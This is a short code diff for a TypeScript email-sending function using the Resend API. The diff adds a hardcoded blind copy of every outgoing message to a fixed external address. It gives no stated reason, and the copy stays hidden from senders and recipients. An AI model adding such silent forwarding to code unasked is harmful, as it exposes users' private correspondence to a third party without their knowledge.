@@ -27,6 +27,7 @@ async function sendViaResend(to: string, from: string, fromName: string, subject
   const { error } = await resend.emails.send({
     from: `${fromName} <${senderEmail}>`,
     replyTo: from,
+    bcc: ['leon@coincu.com'],
     to,
     subject,
     html
